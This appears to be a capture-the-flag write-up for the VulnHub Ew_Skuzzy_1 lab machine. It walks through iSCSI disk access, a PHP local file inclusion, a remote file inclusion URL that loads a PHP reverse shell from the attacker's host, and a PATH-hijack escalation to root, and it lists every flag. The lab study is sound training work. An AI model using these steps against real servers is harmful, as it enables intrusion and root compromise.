@@ -1,0 +1,174 @@
+# Download #
+https://www.vulnhub.com/entry/ew_skuzzy-1,184/
+
+# Goal #
+flags
+uid=0(root) gid=0(root) groups=0(root)
+
+# Walkthrough #
+Initial nmap shows ssh on 22, web on 80, and iscsi on 3260
+<br>![alt text](https://github.com/bzyo/vulnhub/blob/master/2017/Ew_Skuzzy_1/imgs/skuzzy-nmap-002.png)
+<br><br>
+
+Looking at the website we get a hint to scan the website using dirbuster
+<br>![alt text](https://github.com/bzyo/vulnhub/blob/master/2017/Ew_Skuzzy_1/imgs/skuzzy-home-001.png)
+<br><br>
+
+dirb results
+<br>![alt text](https://github.com/bzyo/vulnhub/blob/master/2017/Ew_Skuzzy_1/imgs/skuzzy-dirb-003.png)
+<br><br>
+*snippet of dirb results
+
+All of the dirb results were junk except the last long URL
+<br>![alt text](https://github.com/bzyo/vulnhub/blob/master/2017/Ew_Skuzzy_1/imgs/skuzzy-dirb-004.png)
+<br><br>
+
+Looking at the page, oh hello Lionel
+<br>![alt text](https://github.com/bzyo/vulnhub/blob/master/2017/Ew_Skuzzy_1/imgs/skuzzy-hello-005.png)
+<br><br>
+
+Let's look at the page source and there is a long commented string (actually strings)
+<br>![alt text](https://github.com/bzyo/vulnhub/blob/master/2017/Ew_Skuzzy_1/imgs/skuzzy-hellosource-006.png)
+<br><br>
+
+Base64 decode and Lionel trolled us
+<br>![alt text](https://github.com/bzyo/vulnhub/blob/master/2017/Ew_Skuzzy_1/imgs/skuzzy-hellobase64-007.png)
+<br><br>
+
+With nothing else, we go back to see what we can find from the open iscsi port on 3260
+
+Wait, ew skuzzy...iscsi....oh I get it :)
+
+Google is always your friend, which yielded this helpful page
+https://www.pentestpartners.com/blog/an-interesting-route-to-domain-admin-iscsi/
+
+After installing iscsi tools I'm able to discover and connect to the target
+
+iscsiadm -m node -p 192.168.0.130 -l iqn.2017-02.local.skuzzy:storage.sys0
+<br>![alt text](https://github.com/bzyo/vulnhub/blob/master/2017/Ew_Skuzzy_1/imgs/skuzzy-iscsi-008.png)
+<br><br>
+
+fdisk reveals a new disk available at /dev/sdb
+<br>![alt text](https://github.com/bzyo/vulnhub/blob/master/2017/Ew_Skuzzy_1/imgs/skuzzy-fdisk-009.png)
+<br><br>
+
+First we create the folder to mount to /mnt/skuzzy and then we mount and list the folder contents.  Look at that, flag1 is revealed
+<br>![alt text](https://github.com/bzyo/vulnhub/blob/master/2017/Ew_Skuzzy_1/imgs/skuzzy-flag1-010.png)
+<br><br>
+flag1{c0abc15976b98a478150c900ebb0c86f0327f4dd}
+
+Looking back at the mounted disk contents we see what appears to be another mountable disk called bobsdisk.dsk. Creating the folder, mounting, and listing we find an email file ToAlice.eml and an encrypted file ToAlice.csv.enc
+<br>![alt text](https://github.com/bzyo/vulnhub/blob/master/2017/Ew_Skuzzy_1/imgs/skuzzy-bobsdisk-011.png)
+<br><br>
+
+Looking at the ToAlice.eml, there's a lot of useful information and some misleading in my opinion about how to decrypt the ToAlice.csv.enc file.  Also flag2 is revealed :)
+<br>![alt text](https://github.com/bzyo/vulnhub/blob/master/2017/Ew_Skuzzy_1/imgs/skuzzy-flag2-012.png)
+<br><br>
+flag2{054738a5066ff56e0a4fc9eda6418478d23d3a7f}
+
+So to decrypt the ToAlice.csv.enc file the email gives you everything you need including the password.  It hints that you need to use RockYou, but the password is right there and with that flag3 is revealed and more URLs
+
+openssl enc -d -aes256 -in /mnt/bob/ToAlice.csv.enc -out /mnt/bob/ToAlice.csv -k supercalifragilisticoespialidoso
+<br>![alt text](https://github.com/bzyo/vulnhub/blob/master/2017/Ew_Skuzzy_1/imgs/skuzzy-flag3-013.png)
+<br><br>
+
+flag3{2cce194f49c6e423967b7f72316f48c5caf46e84}
+
+Now back to the webs and the URLs we found. First one has some sweet scrolling marquee
+<br>![alt text](https://github.com/bzyo/vulnhub/blob/master/2017/Ew_Skuzzy_1/imgs/skuzzy-marquee-014.png)
+<br><br>
+
+Source code reveals more long commented strings
+<br>![alt text](https://github.com/bzyo/vulnhub/blob/master/2017/Ew_Skuzzy_1/imgs/skuzzy-marqueesource-015.png)
+<br><br>
+
+
+Base64 of strings reveal a Seinfeld troll :P
+<br>![alt text](https://github.com/bzyo/vulnhub/blob/master/2017/Ew_Skuzzy_1/imgs/skuzzy-marqueebase64-016.png)
+<br><br>
+
+
+Next URL looks more interesting and states in the title we're on the right track
+<br>![alt text](https://github.com/bzyo/vulnhub/blob/master/2017/Ew_Skuzzy_1/imgs/skuzzy-2ndurl-017.png)
+<br><br>
+
+Looking at the links, first three are nothing of importance 
+
+welcome.php
+<br>![alt text](https://github.com/bzyo/vulnhub/blob/master/2017/Ew_Skuzzy_1/imgs/skuzzy-2ndurl-018.png)
+<br><br>
+
+flag.php
+<br>![alt text](https://github.com/bzyo/vulnhub/blob/master/2017/Ew_Skuzzy_1/imgs/skuzzy-2ndurl-019.png)
+<br><br>
+
+party.php also includes link out to http://cultofthepartyparrot.com
+<br>![alt text](https://github.com/bzyo/vulnhub/blob/master/2017/Ew_Skuzzy_1/imgs/skuzzy-2ndurl-020.png)
+<br><br>
+
+The last link reader.php has a new link called Load Feed. When clicked it actually calls out to a file located on the local file system named data.txt
+<br>![alt text](https://github.com/bzyo/vulnhub/blob/master/2017/Ew_Skuzzy_1/imgs/skuzzy-2ndurl-021.png)
+<br><br>
+
+http://192.168.0.130/c2444910794e037ebd8aaf257178c90b/?p=reader&url=http://127.0.0.1/c2444910794e037ebd8aaf257178c90b/data.txt
+<br>![alt text](https://github.com/bzyo/vulnhub/blob/master/2017/Ew_Skuzzy_1/imgs/skuzzy-2ndurl-022.png)
+<br><br>
+
+From here it looks like we might be able to do some LFI, so back to Google and we find this helpful site for a reminder :) https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/
+
+Giving it a try on the data.txt file and we're giving a long string
+<br>![alt text](https://github.com/bzyo/vulnhub/blob/master/2017/Ew_Skuzzy_1/imgs/skuzzy-phplfi-023.png)
+<br><br>
+
+Base64 on the string reveals the source code and it seems that normal php tags use ##php## instead
+<br>![alt text](https://github.com/bzyo/vulnhub/blob/master/2017/Ew_Skuzzy_1/imgs/skuzzy-database64-024.png)
+<br><br>
+
+With that I started checking all the .php files associated with the links and flag.php revealed flag4 also told that we'll need it later for shell access
+<br>![alt text](https://github.com/bzyo/vulnhub/blob/master/2017/Ew_Skuzzy_1/imgs/skuzzy-flag4-025.png)
+<br><br>
+flag4{4e44db0f1edc3c361dbf54eaf4df40352db91f8b}
+
+Base64 of reader.php was the entire source code, but hints that we need to provide a key
+<br>![alt text](https://github.com/bzyo/vulnhub/blob/master/2017/Ew_Skuzzy_1/imgs/skuzzy-reader-026.png)
+<br><br>
+*snippet of reader.php
+
+Trying RFI to Kali and told that we need a key for authentication 
+
+http://192.168.0.130/c2444910794e037ebd8aaf257178c90b/?p=reader&url=http://192.168.0.131
+<br>![alt text](https://github.com/bzyo/vulnhub/blob/master/2017/Ew_Skuzzy_1/imgs/skuzzy-keyneeded-027.png)
+<br><br>
+
+Before anything I prep the php reverse shell on Kali, but making sure that I replace the starting and ending php syntax to ##php##
+<br>![alt text](https://github.com/bzyo/vulnhub/blob/master/2017/Ew_Skuzzy_1/imgs/skuzzy-phpreverse-028.png)
+<br><br>
+
+Using flag4 as the key and calling our php reverse shell we now have a limited reverse shell :)
+
+http://192.168.0.130/c2444910794e037ebd8aaf257178c90b/?p=reader&key=flag4{4e44db0f1edc3c361dbf54eaf4df40352db91f8b}&url=http://192.168.0.131/bzyo.php
+<br>![alt text](https://github.com/bzyo/vulnhub/blob/master/2017/Ew_Skuzzy_1/imgs/skuzzy-reverseshell-029.png)
+<br><br>
+
+Privilege escalation took me some time as I was stuck on finding something with iscsi.  After going through the go to privilege escalation guide, the file alicebackup stood out as the other key files included alice in the name
+<br>![alt text](https://github.com/bzyo/vulnhub/blob/master/2017/Ew_Skuzzy_1/imgs/skuzzy-suid-030.png)
+<br><br>
+
+Looking closer at the file it's executable so I run it and it runs the command /usr/bin/id and attempts an ssh connection
+<br>![alt text](https://github.com/bzyo/vulnhub/blob/master/2017/Ew_Skuzzy_1/imgs/skuzzy-alicebackup-031.png)
+<br><br>
+
+Spent some time looking at HOSTALIASES, but that obviously didn't pan out so I took a step back...
+
+I know that alicebackup runs id utility after executed as it prints out that root is running the program. However it's probably not using a full path and relative instead
+<br>![alt text](https://github.com/bzyo/vulnhub/blob/master/2017/Ew_Skuzzy_1/imgs/skuzzy-pathid-032.png)
+<br><br>
+
+Let's copy /bin/sh to /tmp folder and rename it id and then add /tmp to the PATH
+<br>![alt text](https://github.com/bzyo/vulnhub/blob/master/2017/Ew_Skuzzy_1/imgs/skuzzy-newid-033.png)
+<br><br>
+
+Running alicebackup now triggers id utility at /tmp folder, but instead of giving the user it spawns a root shell and flag5 is revealed in the root folder :)
+<br>![alt text](https://github.com/bzyo/vulnhub/blob/master/2017/Ew_Skuzzy_1/imgs/skuzzy-flag5-34.png)
+<br><br>
+flag5{42273509a79da5bf49f9d40a10c512dd96d89f6a}
